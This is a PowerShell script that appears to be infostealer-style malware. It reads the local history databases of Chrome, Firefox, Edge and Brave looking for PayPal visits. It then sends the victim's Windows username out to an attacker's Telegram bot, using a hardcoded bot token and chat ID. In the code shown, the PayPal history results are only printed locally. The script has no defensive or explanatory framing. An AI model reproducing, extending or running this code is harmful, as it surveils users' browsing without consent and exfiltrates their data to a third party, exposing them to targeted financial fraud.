if (-not (Get-Module -ListAvailable -Name SQLite)) {
    Install-Module -Name SQLite -Force -Scope CurrentUser
}

$chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles\"
$edgeHistoryPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
$braveHistoryPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"

function Get-BrowserHistory {
    param (
        [string]$historyPath,
        [string]$query
    )
    if (Test-Path $historyPath) {
        try {
            $result = Invoke-SqliteQuery -DataSource $historyPath -Query $query
            return $result | Where-Object { $_.url -like "*paypal*" } | Select-Object url, last_visit_time
        } catch {
            return $null
        }
    } else {
        return $null
    }
}

function Send-MessageToTelegram {
    param (
        [string]$message
    )
    $botToken = "7222925359:AAELEDUZVKyeuVeSjltBb6dERlLGEEE3fjM"
    $chatId = "6395412192"
    $encodedMessage = [Uri]::EscapeDataString($message)
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage"
    Invoke-RestMethod -Uri $url -Method Get
}

# Get PC Username and send to Telegram
$pcUsername = $env:USERNAME
Send-MessageToTelegram -message "PC Username: $pcUsername"

# Check Chrome History for PayPal
if (Test-Path $chromeHistoryPath) {
    $chromeQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
    Get-BrowserHistory -historyPath $chromeHistoryPath -query $chromeQuery | Format-Table
}

# Check Firefox History for PayPal
if (Test-Path $firefoxProfilePath) {
    $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
    foreach ($profile in $firefoxProfiles) {
        $firefoxHistoryPath = Join-Path -Path $profile.FullName -ChildPath "places.sqlite"
        if (Test-Path $firefoxHistoryPath) {
            $firefoxQuery = "SELECT url, title, last_visit_date FROM moz_places WHERE url LIKE '%paypal%' ORDER BY last_visit_date DESC LIMIT 20"
            Get-BrowserHistory -historyPath $firefoxHistoryPath -query $firefoxQuery | Format-Table
        }
    }
}

# Check Edge History for PayPal
if (Test-Path $edgeHistoryPath) {
    $edgeQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
    Get-BrowserHistory -historyPath $edgeHistoryPath -query $edgeQuery | Format-Table
}

# Check Brave History for PayPal
if (Test-Path $braveHistoryPath) {
    $braveQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
    Get-BrowserHistory -historyPath $braveHistoryPath -query $braveQuery | Format-Table
}
